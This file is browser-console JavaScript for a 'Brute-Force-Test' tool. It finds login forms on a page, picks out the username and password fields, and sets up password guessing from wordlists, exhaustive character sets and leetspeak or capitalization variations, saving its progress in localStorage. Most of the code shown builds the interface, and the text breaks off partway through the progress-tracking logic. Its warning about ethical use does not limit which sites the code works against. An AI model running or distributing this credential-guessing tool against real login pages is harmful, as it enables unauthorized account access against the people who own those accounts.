// Copy this code into the browser console of your own application
// Warning: Use this tool only for ethical security testing on your own applications!

(function () {
    // Create main container for our tool
    const createToolContainer = () => {
        // Existing code remains unchanged
        const container = document.createElement('div');
        container.id = 'security-test-tool';
        container.style.cssText = `
      position: fixed;
      top: 20px;
      right: 20px;
      width: 400px;
      background-color: #2C2E3B;
      color: white;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      font-family: Arial, sans-serif;
      z-index: 9999;
      padding: 15px;
      max-height: 90vh;
      overflow-y: auto;
    `;

        // Add header
        const header = document.createElement('div');
        header.innerHTML = `
      <h2 style="margin: 0 0 15px 0; font-size: 18px; display: flex; justify-content: space-between; align-items: center;">
        <span>Brute-Force-Test</span>
        <div style="display: flex; gap: 5px;">
          <button id="security-tool-toggle" style="background: none; border: none; color: white; cursor: pointer; font-size: 20px;">−</button>
          <button id="security-tool-close" style="background: none; border: none; color: white; cursor: pointer; font-size: 18px;">✕</button>
        </div>
      </h2>
    `;
        container.appendChild(header);

        // Add content area
        const content = document.createElement('div');
        content.id = 'security-tool-content';
        container.appendChild(content);

        document.body.appendChild(container);

        // Toggle functionality
        document.getElementById('security-tool-toggle').addEventListener('click', function () {
            const content = document.getElementById('security-tool-content');
            if (content.style.display === 'none') {
                content.style.display = 'block';
                this.textContent = '−';
            } else {
                content.style.display = 'none';
                this.textContent = '+';
            }
        });
        
        // Close functionality
        document.getElementById('security-tool-close').addEventListener('click', function () {
            const tool = document.getElementById('security-test-tool');
            if (tool) {
                tool.remove();
            }
        });

        // Drag functionality
        let isDragging = false;
        let offsetX, offsetY;

        header.addEventListener('mousedown', function (e) {
            if (e.target.id === 'security-tool-toggle' || e.target.id === 'security-tool-close') return; // Don't drag when clicking on buttons

            isDragging = true;
            const containerRect = container.getBoundingClientRect();
            offsetX = e.clientX - containerRect.left;
            offsetY = e.clientY - containerRect.top;

            container.style.cursor = 'grabbing';
        });

        document.addEventListener('mousemove', function (e) {
            if (!isDragging) return;

            container.style.left = (e.clientX - offsetX) + 'px';
            container.style.top = (e.clientY - offsetY) + 'px';
        });

        document.addEventListener('mouseup', function () {
            isDragging = false;
            container.style.cursor = 'default';
        });

        return content;
    };

    // Remove the tool if it already exists
    const existingTool = document.getElementById('security-test-tool');
    if (existingTool) {
        // Clean up event listeners to prevent memory leaks
        if (window.securityToolCleanup) {
            window.securityToolCleanup();
        }
        document.body.removeChild(existingTool);
    }

    // Create tool container
    const contentArea = createToolContainer();

    // Scanner for form fields with SPA support
    const scanForFields = () => {
        // Find all input fields including Angular Material
        const allInputs = document.querySelectorAll('input, textarea, select, mat-input');
        const formFields = [];

        // Analyze fields by types and attributes
        allInputs.forEach(input => {
            const type = input.type || 'text';
            const id = input.id || '';
            const name = input.name || '';
            const placeholder = input.placeholder || '';
            const classes = Array.from(input.classList).join(' ');
            const isPassword = type === 'password';
            const isHidden = input.style.display === 'none' ||
                window.getComputedStyle(input).display === 'none' ||
                input.type === 'hidden';

            let fieldType = type;

            // Try to intelligently guess the field type
            if (isPassword) {
                fieldType = 'password';
            } else if (name.toLowerCase().includes('user') ||
                id.toLowerCase().includes('user') ||
                placeholder.toLowerCase().includes('user') ||
                classes.toLowerCase().includes('user') ||
                name.toLowerCase().includes('email') ||
                id.toLowerCase().includes('email') ||
                placeholder.toLowerCase().includes('email') ||
                classes.toLowerCase().includes('email')) {
                fieldType = 'username';
            }

            // Check Angular Material labels
            const matFormField = input.closest('mat-form-field');
            if (matFormField) {
                const label = matFormField.querySelector('mat-label');
                if (label) {
                    const labelText = label.textContent.toLowerCase();
                    if (labelText.includes('password')) {
                        fieldType = 'password';
                    } else if (labelText.includes('user') || labelText.includes('email')) {
                        fieldType = 'username';
                    }
                }
            }

            formFields.push({
                element: input,
                type: fieldType,
                id,
                name,
                placeholder,
                classes,
                isPassword,
                isHidden
            });
        });

        return formFields;
    };

    // Scan forms (existing code)
    const scanForms = () => {
        const forms = document.querySelectorAll('form');
        const formList = [];

        forms.forEach((form, index) => {
            const id = form.id || `form-${index}`;
            const action = form.action || 'unknown';
            const method = form.method || 'GET';
            const submitButton = form.querySelector('button[type="submit"], input[type="submit"]');

            formList.push({
                element: form,
                id,
                action,
                method,
                submitButton,
                fields: Array.from(form.querySelectorAll('input, textarea, select'))
            });
        });

        return formList;
    };

    // Helper functions for localStorage management
    const getStorageKey = (usernameField, username) => {
        const hostname = window.location.hostname;
        const fieldId = usernameField.id || usernameField.name || 'unknown-field';
        return `bruteforce_${hostname}_${fieldId}_${username}`;
    };

    const saveProgress = (usernameField, username, currentIndex, totalPasswords, passwords, options, method) => {
        try {
            const storageKey = getStorageKey(usernameField, username);
            const progressData = {
                currentIndex,
                totalPasswords,
                passwords: passwords.slice(0, Math.min(passwords.length, 1000)), // Limit to 1000 entries
                options,
                method,
                timestamp: Date.now(),
                url: window.location.href,
                username: username, // Save username for restoration
                basePhrases: window.multiplePhrases || (method === 'variations' && document.getElementById('base-phrase') ? [document.getElementById('base-phrase').value] : [])
            };
            localStorage.setItem(storageKey, JSON.stringify(progressData));
        } catch (e) {
            console.warn('Failed to save progress to localStorage:', e);
        }
    };

    const loadProgress = (usernameField, username) => {
        try {
            const storageKey = getStorageKey(usernameField, username);
            const stored = localStorage.getItem(storageKey);
            if (stored) {
                return JSON.parse(stored);
            }
        } catch (e) {
            console.warn('Failed to load progress from localStorage:', e);
        }
        return null;
    };

    const clearProgress = (usernameField, username) => {
        try {
            const storageKey = getStorageKey(usernameField, username);
            localStorage.removeItem(storageKey);
        } catch (e) {
            console.warn('Failed to clear progress from localStorage:', e);
        }
    };

    const loadSavedProgress = (progressItem) => {
        try {
            // Hide progress notification
            const progressNotification = document.querySelector('div[style*="background-color: #3a5f3a"]');
            if (progressNotification) {
                progressNotification.style.display = 'none';
            }
            
            // Load the progress data
            window.savedProgress = progressItem.data;
            
            // Restore UI parameters
            restoreUIParameters(progressItem.data);
            
            updateStatus(`Loaded progress: ${progressItem.data.currentIndex}/${progressItem.data.totalPasswords} attempts completed`, false);
        } catch (e) {
            console.error('Failed to load saved progress:', e);
            updateStatus('Error loading saved progress', true);
        }
    };

    const restoreUIParameters = (progressData) => {
        try {
            // Get username from saved data
            const username = progressData.username || '';
            
            // Set username field
            const usernameInput = document.getElementById('bf-username');
            if (usernameInput && username) {
                usernameInput.value = username;
            }
            
            // Set method
            const methodSelect = document.getElementById('bf-method');
            if (methodSelect && progressData.method) {
                methodSelect.value = progressData.method;
                // Trigger change event to show correct sections
                methodSelect.dispatchEvent(new Event('change'));
            }
            
            // Restore method-specific parameters
            if (progressData.method === 'variations' && progressData.options) {
                // Restore variation options
                const leetspeakCheckbox = document.getElementById('use-leetspeak');
                const separatorsCheckbox = document.getElementById('use-separators');
                const capitalizationCheckbox = document.getElementById('use-capitalization');
                const rushModeCheckbox = document.getElementById('rush-mode');
                
                if (leetspeakCheckbox) leetspeakCheckbox.checked = progressData.options.useLeetspeak || false;
                if (separatorsCheckbox) separatorsCheckbox.checked = progressData.options.useSeparators || false;
                if (capitalizationCheckbox) capitalizationCheckbox.checked = progressData.options.useCapitalization || false;
                if (rushModeCheckbox) rushModeCheckbox.checked = progressData.options.rushMode || false;
                
                // Restore base phrases if available
                if (progressData.basePhrases) {
                    if (progressData.basePhrases.length === 1) {
                        // Single phrase
                        const basePhraseInput = document.getElementById('base-phrase');
                        if (basePhraseInput) {
                            basePhraseInput.value = progressData.basePhrases[0];
                        }
                    } else if (progressData.basePhrases.length > 1) {
                        // Multiple phrases
                        window.multiplePhrases = progressData.basePhrases;
                        const multiplePhrasesInput = document.getElementById('multiple-phrases-input');
                        if (multiplePhrasesInput) {
                            multiplePhrasesInput.value = progressData.basePhrases.join('\n');
                        }
                    }
                }
            } else if (progressData.method === 'list' && progressData.passwords) {
                // Restore password list
                const passwordListTextarea = document.getElementById('bf-password-list');
                if (passwordListTextarea) {
                    passwordListTextarea.value = progressData.passwords.slice(0, 100).join('\n') + 
                        (progressData.passwords.length > 100 ? '\n...(truncated)' : '');
                }
            }
            
            updateStatus('Parameters restored from saved progress', false);
        } catch (e) {
            console.error('Failed to restore UI parameters:', e);
        }
    };

    const showProgressSelectionDialog = (progressList) => {
        // Create selection dialog
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
        `;
        
        const dialog = document.createElement('div');
        dialog.style.cssText = `
            background-color: #2C2E3B;
            color: white;
            padding: 20px;
            border-radius: 8px;
            max-width: 500px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        `;
        
        dialog.innerHTML = `
            <h3 style="margin: 0 0 15px 0;">Select Progress to Continue</h3>
            <div id="progress-selection-list" style="margin-bottom: 15px;">
                ${progressList.map((item, index) => {
                    const username = item.key.split('_').pop();
                    const age = Math.round((Date.now() - item.data.timestamp) / (1000 * 60));
                    const method = item.data.method || 'unknown';
                    return `
                        <div style="
                            background-color: #373948;
                            padding: 10px;
                            margin: 5px 0;
                            border-radius: 5px;
                            cursor: pointer;
                            border: 2px solid transparent;
                        " data-index="${index}" onclick="selectProgress(this, ${index})">
                            <div style="font-weight: bold;">Username: ${username}</div>
                            <div style="font-size: 12px; color: #aaa;">
                                Method: ${method} | Progress: ${item.data.currentIndex}/${item.data.totalPasswords} | Age: ${age}min
                            </div>
                        </div>
                    `;
                }).join('')}
            </div>
            <div style="display: flex; gap: 10px;">
                <button id="confirm-selection" style="flex: 1; padding: 10px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer;" disabled>Continue Selected</button>
                <button id="cancel-selection" style="flex: 1; padding: 10px; background-color: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
            </div>
        `;
        
        overlay.appendChild(dialog);
        document.body.appendChild(overlay);
        
        // Selection logic
        let selectedIndex = -1;
        
        window.selectProgress = function(element, index) {
            // Remove previous selection
            document.querySelectorAll('#progress-selection-list > div').forEach(div => {
                div.style.border = '2px solid transparent';
            });
            
            // Add selection to clicked element
            element.style.border = '2px solid #4CAF50';
            selectedIndex = index;
            
            // Enable confirm button
            document.getElementById('confirm-selection').disabled = false;
        };
        
        // Confirm selection
        document.getElementById('confirm-selection').addEventListener('click', function() {
            if (selectedIndex >= 0) {
                loadSavedProgress(progressList[selectedIndex]);
                document.body.removeChild(overlay);
                delete window.selectProgress;
            }
        });
        
        // Cancel selection
        document.getElementById('cancel-selection').addEventListener('click', function() {
            document.body.removeChild(overlay);
            delete window.selectProgress;
        });
    };

    const checkForExistingProgress = () => {
        try {
            const hostname = window.location.hostname;
            const keys = Object.keys(localStorage).filter(key => key.startsWith(`bruteforce_${hostname}_`));
            return keys.map(key => {
                try {
                    const data = JSON.parse(localStorage.getItem(key));
                    return { key, data };
                } catch (e) {
                    return null;
                }
            }).filter(item => item !== null);
        } catch (e) {
            return [];
        }
    };

    // Create UI
    const createUI = () => {
        const fields = scanForFields();
        const forms = scanForms();
        const passwordFields = fields.filter(f => f.isPassword);
        // Expand the detection of username fields
        const usernameFields = fields.filter(f =>
            f.type === 'username' ||
            f.type === 'email' ||
            f.type === 'text' || // Add text fields, as many login forms use simple text inputs for usernames
            (!f.isPassword && !f.isHidden && (
                f.id.toLowerCase().includes('user') ||
                f.id.toLowerCase().includes('email') ||
                f.id.toLowerCase().includes('login') ||
                f.name.toLowerCase().includes('user') ||
                f.name.toLowerCase().includes('email') ||
                f.name.toLowerCase().includes('login') ||
                f.placeholder.toLowerCase().includes('user') ||
                f.placeholder.toLowerCase().includes('email') ||
                f.placeholder.toLowerCase().includes('login')
            ))
        );

        // HTML for the tool
        let html = `
      <div style="margin-bottom: 15px;">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">Found Form Fields:</h3>
        <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
    `;

        if (fields.length === 0) {
            html += `<p style="margin: 0; color: #ff9999;">No form fields found.</p>`;
        } else {
            html += `<ul style="margin: 0; padding-left: 20px;">`;
            fields.forEach(field => {
                const hiddenText = field.isHidden ? ' (hidden)' : '';
                html += `<li style="margin-bottom: 5px;">
          <span style="font-weight: bold;">${field.type}</span>: 
          ${field.id || field.name || 'unnamed'}${hiddenText}
        </li>`;
            });
            html += `</ul>`;
        }
        html += `</div></div>`;

        // Display forms
        html += `
      <div style="margin-bottom: 15px;">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">Found Forms:</h3>
        <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
    `;

        if (forms.length === 0) {
            html += `<p style="margin: 0; color: #ff9999;">No forms found.</p>`;
        } else {
            html += `<ul style="margin: 0; padding-left: 20px;">`;
            forms.forEach(form => {
                html += `<li style="margin-bottom: 5px;">
          <span style="font-weight: bold;">${form.id}</span>: 
          Method: ${form.method}, Fields: ${form.fields.length}
        </li>`;
            });
            html += `</ul>`;
        }
        html += `</div></div>`;

        // Check for existing progress and show notification
        const existingProgress = checkForExistingProgress();
        if (existingProgress.length > 0) {
            html += `
        <div style="margin-bottom: 15px;">
          <div style="background-color: #3a5f3a; padding: 10px; border-radius: 5px; border-left: 4px solid #4CAF50;">
            <h4 style="margin: 0 0 8px 0; color: #4CAF50;">Previous Progress Found</h4>
            <p style="margin: 0 0 8px 0; font-size: 13px;">Found ${existingProgress.length} saved session(s) for this site.</p>
            <div id="progress-list" style="margin-bottom: 10px; max-height: 100px; overflow-y: auto;">
              ${existingProgress.map(item => {
                const age = Math.round((Date.now() - item.data.timestamp) / (1000 * 60));
                return `<div style="font-size: 12px; margin: 2px 0; padding: 4px; background-color: rgba(0,0,0,0.2); border-radius: 3px;">
                  <strong>User:</strong> ${item.key.split('_').pop()} | 
                  <strong>Progress:</strong> ${item.data.currentIndex}/${item.data.totalPasswords} | 
                  <strong>Age:</strong> ${age}min
                </div>`;
              }).join('')}
            </div>
            <div style="display: flex; gap: 5px;">
              <button id="continue-progress" style="flex: 1; padding: 6px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer;">Continue Latest</button>
              <button id="clear-progress" style="flex: 1; padding: 6px; background-color: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer;">Clear All</button>
              <button id="start-fresh" style="flex: 1; padding: 6px; background-color: #2196F3; color: white; border: none; border-radius: 4px; cursor: pointer;">Start Fresh</button>
            </div>
          </div>
        </div>
      `;
        }

        // Only show brute-force area if password and username fields were found
        if (passwordFields.length > 0 && usernameFields.length > 0) {
            html += `
        <div style="margin-bottom: 15px;">
          <h3 style="margin: 0 0 8px 0; font-size: 16px;">Brute-Force Test:</h3>
          <div style="background-color: #373948; padding: 10px; border-radius: 5px;">
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Username field:</label>
              <select id="username-field-select" style="width: 100%; padding: 5px; border-radius: 4px;">
                ${usernameFields.map((field, idx) =>
                `<option value="${idx}">${field.id || field.name || 'Field ' + idx} (${field.type})</option>`
            ).join('')}
              </select>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Password field:</label>
              <select id="password-field-select" style="width: 100%; padding: 5px; border-radius: 4px;">
                ${passwordFields.map((field, idx) =>
                `<option value="${idx}">${field.id || field.name || 'Field ' + idx} (${field.type})</option>`
            ).join('')}
              </select>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Username:</label>
              <input type="text" id="bf-username" style="width: 100%; padding: 5px; border-radius: 4px;" 
                     placeholder="Username to test">
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Brute-Force Method:</label>
              <select id="bf-method" style="width: 100%; padding: 5px; border-radius: 4px;">
                <option value="list">Use password list</option>
                <option value="charset">Use character set (all combinations)</option>
                <option value="variations">Generate variations (leetspeak, capitalization, separators)</option>
              </select>
            </div>
            
            <div style="margin-bottom: 10px;">
              <button id="show-password-generator" style="background-color: #4a6ed3; color: white; border: none; border-radius: 4px; padding: 8px 15px; cursor: pointer; width: 100%;">
                Show Generated Passwords
              </button>
            </div>
            
            <div style="margin-bottom: 10px;">
              <button id="show-debug-info" style="background-color: #6c757d; color: white; border: none; border-radius: 4px; padding: 8px 15px; cursor: pointer; width: 100%;">
                Show Debug Info
              </button>
            </div>
            
            <div id="password-list-section" style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Password Source:</label>
              <div style="margin-bottom: 10px;">
                <select id="password-source" style="width: 100%; padding: 5px; border-radius: 4px;">
                  <option value="local">Local file</option>
                  <option value="manual">Manual entry</option>
                </select>
              </div>
              
              <!-- Local file option -->
              <div id="local-file-section">
                <div style="display: flex; margin-bottom: 5px;">
                  <input type="file" id="password-file" accept=".txt" style="flex-grow: 1;">
                  <button id="load-password-file" style="background-color: #4a6ed3; color: white; border: none; border-radius: 4px; padding: 0 10px; cursor: pointer; margin-left: 5px;">Load</button>
                </div>
                <div id="file-info" style="font-size: 12px; margin-bottom: 5px; color: #aaa; display: none;">
                  File loaded: <span id="file-name"></span> (<span id="password-count">0</span> passwords)
                </div>
              </div>
              
              <!-- Manual entry -->
              <div id="manual-entry-section" style="display: none;">
                <textarea id="bf-password-list" style="width: 100%; height: 80px; padding: 5px; border-radius: 4px;" 
                        placeholder="One password per line"></textarea>
              </div>
            </div>
            
            <div id="charset-section" style="margin-bottom: 10px; display: none;">
              <div style="margin-bottom: 10px;">
                <label style="display: block; margin-bottom: 5px;">Character set:</label>
                <div style="display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 5px;">
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-lowercase" checked> a-z
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-uppercase"> A-Z
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-numbers"> 0-9
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="charset-special"> !@#$%^&*
                  </label>
                </div>
                <input type="text" id="charset-custom" style="width: 100%; padding: 5px; border-radius: 4px;" 
                       placeholder="Custom character set (optional)">
              </div>
              
              <div style="display: flex; gap: 10px; margin-bottom: 5px;">
                <div style="flex: 1;">
                  <label style="display: block; margin-bottom: 5px;">Min. Length:</label>
                  <input type="number" id="min-length" style="width: 100%; padding: 5px; border-radius: 4px;" value="1" min="1" max="8">
                </div>
                <div style="flex: 1;">
                  <label style="display: block; margin-bottom: 5px;">Max. Length:</label>
                  <input type="number" id="max-length" style="width: 100%; padding: 5px; border-radius: 4px;" value="3" min="1" max="8">
                </div>
              </div>
              
              <div style="background-color: #2c2e3b; padding: 5px; border-radius: 4px; font-size: 12px; margin-bottom: 5px;">
                <strong>Warning:</strong> Large character sets and lengths > 4 can be very slow and may freeze the browser.
              </div>
            </div>
            
            <div id="variations-section" style="margin-bottom: 10px; display: none;">
              <div style="margin-bottom: 10px;">
                <label style="display: block; margin-bottom: 5px;">Base password/phrase:</label>
                <div style="display: flex; gap: 5px;">
                  <input type="text" id="base-phrase" style="flex: 1; padding: 5px; border-radius: 4px;" 
                         placeholder="e.g., mr.noodles">
                  <button id="add-multiple-phrases" style="padding: 5px 10px; background-color: #4a6ed3; color: white; 
                         border: none; border-radius: 4px; cursor: pointer; font-size: 16px;" title="Add multiple phrases">+</button>
                </div>
              </div>
              
              <div id="multiple-phrases-section" style="margin-bottom: 10px; display: none;">
                <label style="display: block; margin-bottom: 5px;">Multiple base phrases (one per line):</label>
                <textarea id="multiple-phrases-input" style="width: 100%; height: 100px; padding: 5px; border-radius: 4px; 
                         font-family: monospace; font-size: 12px;" 
                         placeholder="admin&#10;password123&#10;mr.noodles&#10;test&#10;..."></textarea>
                <div style="display: flex; gap: 5px; margin-top: 5px;">
                  <button id="multiple-phrases-ok" style="flex: 1; padding: 5px; background-color: #4a6ed3; color: white; 
                         border: none; border-radius: 4px; cursor: pointer;">OK (Ctrl/Cmd+Enter)</button>
                  <button id="multiple-phrases-cancel" style="flex: 1; padding: 5px; background-color: #d34a4a; color: white; 
                         border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
                </div>
              </div>
              
              <div style="margin-bottom: 10px;">
                <label style="display: block; margin-bottom: 5px;">Variation options:</label>
                <div style="display: flex; flex-wrap: wrap; gap: 10px;">
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="use-leetspeak" checked> Leetspeak
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="use-separators" checked> Separator variations
                  </label>
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="use-capitalization" checked> Capitalization
                  </label>
                </div>
                <div style="margin-top: 8px;">
                  <label style="display: flex; align-items: center;">
                    <input type="checkbox" id="rush-mode"> 
                    <span style="margin-left: 5px;">Rush Mode (50% fewer variations - common ones only)</span>
                  </label>
                </div>
              </div>
              
              <button id="preview-variations" style="width: 100%; padding: 8px; background-color: #5a5a5a; color: white; 
                     border: none; border-radius: 4px; cursor: pointer; margin-bottom: 5px;">
                <span id="preview-toggle-text">▼ Show Variations Preview</span>
              </button>
              
              <div id="variations-preview-container" style="display: none; margin-bottom: 5px;">
                <div style="display: flex; gap: 5px; margin-bottom: 8px;">
                  <button id="show-all-variations" style="flex: 1; padding: 6px; background-color: #4a6ed3; color: white; 
                         border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">Show All</button>
                  <button id="show-random-sample" style="flex: 1; padding: 6px; background-color: #6ed34a; color: white; 
                         border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">Random Sample</button>
                </div>
                <div id="variations-preview" style="max-height: 150px; overflow-y: auto; background-color: #252733; 
                       padding: 8px; border-radius: 4px; font-size: 12px;">
                  Click "Show All" or "Random Sample" to preview variations
                </div>
              </div>
            </div>
            
            <div style="margin-bottom: 10px;">
              <label style="display: block; margin-bottom: 5px;">Delay between attempts (ms):</label>
              <input type="number" id="bf-delay" style="width: 100%; padding: 5px; border-radius: 4px;" value="10">
            </div>
            
            <div style="display: flex; gap: 10px;">
              <button id="start-bf-button" style="flex-grow: 1; padding: 8px; background-color: #4a6ed3; color: white; 
                     border: none; border-radius: 4px; cursor: pointer;">Start</button>
              <button id="stop-bf-button" style="flex-grow: 1; padding: 8px; background-color: #d34a4a; color: white; 
                     border: none; border-radius: 4px; cursor: pointer; display: none;">Stop</button>
            </div>
            
            <div id="bf-status" style="margin-top: 10px; padding: 8px; background-color: #2C2E3B; border-radius: 4px;">
              Ready...
            </div>
            
            <div id="current-attempt" style="margin-top: 5px; padding: 6px; background-color: #1a1a2e; border-radius: 4px; font-size: 12px; color: #aaa; display: none;">
              Current: -
            </div>
            
            <div id="progress-section" style="margin-top: 10px; display: none;">
              <!-- Progress Bar -->
              <div style="margin-bottom: 8px;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 3px; font-size: 12px;">
                  <span id="progress-text">0 / 0 (0%)</span>
                  <span id="progress-speed">0 attempts/sec</span>
                </div>
                <div style="width: 100%; background-color: #1a1a2e; border-radius: 10px; height: 8px;">
                  <div id="progress-bar" style="width: 0%; background: linear-gradient(90deg, #4a6ed3, #689f38); height: 8px; border-radius: 10px; transition: width 0.3s ease;"></div>
                </div>
              </div>
              
              <!-- Time Information -->
              <div style="display: flex; justify-content: space-between; font-size: 11px; color: #aaa;">
                <div>
                  <span>Elapsed: </span><span id="time-elapsed">00:00:00</span>
                </div>
                <div>
                  <span>Remaining: </span><span id="time-remaining">--:--:--</span>
                </div>
                <div>
                  <span>Total: </span><span id="time-total">--:--:--</span>
                </div>
              </div>
            </div>
            
            <div id="info-line" style="margin-top: 10px; padding: 8px; background-color: #252733; border-radius: 4px; font-size: 13px; display: none;">
              <div>Last attempt: <span id="last-attempt">-</span></div>
              <div>Status: <span id="last-attempt-status">-</span></div>
            </div>
            
            <div id="variations-progress" style="margin-top: 10px; padding: 8px; background-color: #1a1a2e; border-radius: 4px; font-size: 12px; display: none;">
              <div style="margin-bottom: 8px;">
                <strong>Current Base Word:</strong> <span id="current-base-word">-</span>
              </div>
              <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                <span><strong>Completed:</strong> <span id="completed-words">0</span></span>
                <span><strong>Remaining:</strong> <span id="remaining-words">0</span></span>
              </div>
              <div style="margin-bottom: 5px;">
                <div style="width: 100%; background-color: #0d0d1a; border-radius: 5px; height: 6px;">
                  <div id="word-progress-bar" style="width: 0%; background: linear-gradient(90deg, #9c27b0, #e91e63); height: 6px; border-radius: 5px; transition: width 0.3s ease;"></div>
                </div>
              </div>
              <div id="word-list" style="max-height: 80px; overflow-y: auto; font-size: 11px;">
                <div><strong>Words:</strong></div>
                <div id="words-status" style="margin-top: 3px;"></div>
              </div>
            </div>
          </div>
        </div>
      `;
        }

        contentArea.innerHTML = html;

        // Add event listeners for progress management
        const continueProgressBtn = document.getElementById('continue-progress');
        const clearProgressBtn = document.getElementById('clear-progress');
        const startFreshBtn = document.getElementById('start-fresh');

        if (continueProgressBtn) {
            continueProgressBtn.addEventListener('click', function() {
                const existingProgress = checkForExistingProgress();
                if (existingProgress.length > 0) {
                    // If multiple progress entries exist, let user choose
                    if (existingProgress.length > 1) {
                        showProgressSelectionDialog(existingProgress);
                    } else {
                        // Load the single progress entry
                        loadSavedProgress(existingProgress[0]);
                    }
                }
            });
        }

        if (clearProgressBtn) {
            clearProgressBtn.addEventListener('click', function() {
                if (confirm('Are you sure you want to clear all saved progress?')) {
                    const hostname = window.location.hostname;
                    const keys = Object.keys(localStorage).filter(key => key.startsWith(`bruteforce_${hostname}_`));
                    keys.forEach(key => localStorage.removeItem(key));
                    
                    // Hide progress notification
                    this.closest('div').closest('div').style.display = 'none';
                    updateStatus('All saved progress cleared', false);
                }
            });
        }

        if (startFreshBtn) {
            startFreshBtn.addEventListener('click', function() {
                // Hide progress notification
                this.closest('div').closest('div').style.display = 'none';
                window.savedProgress = null;
                updateStatus('Starting fresh session', false);
            });
        }

        // Add event listeners if password and username fields were found
        if (passwordFields.length > 0 && usernameFields.length > 0) {
            let running = false;
            let stopRequested = false;
            let passwords = []; // Global variable for all passwords
            let startTime = null;
            let lastUpdateTime = null;
            let attemptsHistory = [];
            
            // Auto-fill username when typed in the tool
            const usernameInput = document.getElementById('bf-username');
            if (usernameInput) {
                usernameInput.addEventListener('input', function() {
                    const username = this.value;
                    const usernameFieldIdx = parseInt(document.getElementById('username-field-select').value);
                    const usernameField = usernameFields[usernameFieldIdx];
                    
                    if (usernameField && usernameField.element) {
                        usernameField.element.value = username;
                        // Trigger input event to notify the application
                        usernameField.element.dispatchEvent(new Event('input', { bubbles: true }));
                        usernameField.element.dispatchEvent(new Event('change', { bubbles: true }));
                    }
                    
                    // Also try to fill the email field directly by ID
                    const emailField = document.getElementById('email');
                    if (emailField) {
                        emailField.value = username;
                        emailField.dispatchEvent(new Event('input', { bubbles: true }));
                        emailField.dispatchEvent(new Event('change', { bubbles: true }));
                    }
                });
            }
            
            // Show password generator button
            const showPasswordGeneratorBtn = document.getElementById('show-password-generator');
            if (showPasswordGeneratorBtn) {
                showPasswordGeneratorBtn.addEventListener('click', function() {
                    if (window.generatedPasswordsData) {
                        createPasswordDisplayOverlay(
                            window.generatedPasswordsData.passwords,
                            window.generatedPasswordsData.basePhrases,
                            window.generatedPasswordsData.wordVariationsMap
                        );
                    } else {
                        updateStatus('No passwords generated yet. Start a brute-force test with "variations" method first.', true);
                    }
                });
            }
            
            // Show debug info button
            const showDebugBtn = document.getElementById('show-debug-info');
            if (showDebugBtn) {
                showDebugBtn.addEventListener('click', function() {
                    const existingDebug = document.getElementById('debug-info');
                    if (existingDebug) {
                        existingDebug.remove();
                    } else {
                        addDebugInfo();
                    }
                });
            }
            
            // Helper function to format time
            const formatTime = (seconds) => {
                const hours = Math.floor(seconds / 3600);
                const minutes = Math.floor((seconds % 3600) / 60);
                const secs = Math.floor(seconds % 60);
                return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            };
            
            // Helper function to update progress
            const updateProgress = (current, total) => {
                const progressSection = document.getElementById('progress-section');
                const progressBar = document.getElementById('progress-bar');
                const progressText = document.getElementById('progress-text');
                const progressSpeed = document.getElementById('progress-speed');
                const timeElapsed = document.getElementById('time-elapsed');
                const timeRemaining = document.getElementById('time-remaining');
                const timeTotal = document.getElementById('time-total');
                
                if (!progressSection || !startTime) return;
                
                // Show progress section
                progressSection.style.display = 'block';
                
                // Calculate progress
                const percentage = total > 0 ? (current / total) * 100 : 0;
                progressBar.style.width = percentage + '%';
                progressText.textContent = `${current.toLocaleString()} / ${total.toLocaleString()} (${percentage.toFixed(1)}%)`;
                
                // Calculate elapsed time
                const now = Date.now();
                const elapsedSeconds = (now - startTime) / 1000;
                timeElapsed.textContent = formatTime(elapsedSeconds);
                
                // Update speed calculation every 100 attempts or every 5 seconds
                if (current % 100 === 0 || !lastUpdateTime || now - lastUpdateTime >= 5000) {
                    // Store attempt history (keep last 10 entries)
                    attemptsHistory.push({ time: now, attempts: current });
                    if (attemptsHistory.length > 10) {
                        attemptsHistory.shift();
                    }
                    
                    // Calculate speed based on recent history
                    if (attemptsHistory.length >= 2) {
                        const recent = attemptsHistory[attemptsHistory.length - 1];
                        const older = attemptsHistory[0];
                        const timeDiff = (recent.time - older.time) / 1000;
                        const attemptsDiff = recent.attempts - older.attempts;
                        const speed = timeDiff > 0 ? attemptsDiff / timeDiff : 0;
                        
                        progressSpeed.textContent = `${speed.toFixed(1)} attempts/sec`;
                        
                        // Calculate remaining time
                        if (speed > 0 && current < total) {
                            const remainingAttempts = total - current;
                            const remainingSeconds = remainingAttempts / speed;
